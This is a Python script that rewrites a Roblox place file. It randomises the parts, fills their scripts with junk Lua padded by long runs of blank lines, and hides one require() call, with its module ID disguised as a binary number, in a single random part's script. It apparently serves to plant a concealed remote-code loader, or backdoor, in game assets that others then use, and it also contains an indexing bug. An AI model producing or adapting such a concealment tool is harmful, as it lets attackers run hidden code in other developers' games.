# By ! neяo#5442 @HS Softworks | 2022 "Hi zack ^-^"
import datetime
import random
import string
import xml.etree.ElementTree as ET
#To time the execution of script
begin_time = datetime.datetime.now()

def randomParts(fpath, id, newFile):
  #Parses xml file into an iterable object
  tree = ET.parse(fpath)
  root = tree.getroot()
  print("parsed")
  # Get list of properties of all item tags with class value Part
  isAnchored = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/bool[@name="Anchored"]')
  xPositions = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/CoordinateFrame[@name="CFrame"]/X')
  yPositions = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/CoordinateFrame[@name="CFrame"]/Y')
  zPositions = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/CoordinateFrame[@name="CFrame"]/Z')
  xSizes = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/Vector3[@name="size"]/X')
  ySizes = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/Vector3[@name="size"]/Y')
  zSizes = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/Vector3[@name="size"]/Z')
  colors = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/Color3uint8[@name="Color3uint8"]')
  names = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Properties/string[@name="Name"]')
  scripts = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]/Item[@class="Script"]/Properties/ProtectedString[@name="Source"]')
  print("fetched elements")
  # Edit properties
  for anchored in isAnchored:
      anchored.text = 'true'
  print("anchored")
  # Random float positions
  for xpos in xPositions:
      xpos.text = str(random.uniform(-6, 20))
  for ypos in yPositions:
      ypos.text = str(random.uniform(-5, 5))
  for zpos in zPositions:
      zpos.text = str(random.uniform(-5, 5))
  print("random positions")
  # Random float part sizes
  for xSize in xSizes:
      xSize.text = str(random.uniform(1, 2))
  for ySize in ySizes:
      ySize.text = str(random.uniform(1, 2))
  for zSize in zSizes:
      zSize.text = str(random.uniform(1, 2))
  print("random sizes") 
  # Decimal color code for roblox legacy format
  for color3 in colors:
      color3.text = str(random.randint(4278190080, 4294967295))
  print("random colors")
  # Part name is current runtime
  for name in names:
      name.text = str(datetime.datetime.now() - begin_time)
  print("renamed")
  
  def randomString():
      return ''.join(random.choice(string.ascii_letters) for x in range(random.randrange(4, 200)))
  def randomWhiteSpace():
      newLine = ''
      whitespaces = random.randint(10 ,500)
      for n in range(0, whitespaces, 1):
          newLine = newLine + '\n'
      return newLine
  #Put junk code in all scripts so require is in only one script
  for script in scripts:
    script.text = f'--{randomString()}{randomWhiteSpace()}local part = script.Parent{randomWhiteSpace()}function getName() print(part.Name) end {randomWhiteSpace()}getName()'
  print("junk code completed")
  
  #Choose random part update its script with binary module id
  parts = root.findall('.//Item[@class="Folder"]/Item[@class="Part"]')
  part = parts[random.randint(0, len(parts))]
  script = part.find('.//Item[@class="Script"]/Properties/ProtectedString[@name="Source"]')
  script.text = f'--{randomString()}{randomWhiteSpace()}local part = {bin(int(float(id)))}{randomWhiteSpace()}function getName() require(tonumber(part))end{randomWhiteSpace()}getName()'
  print("random script updated with require")
  
  # Update file and clear memory
  if newFile == True:
      tree.write('Place.rbxlx')
  else:
      tree.write(fpath)
  del tree
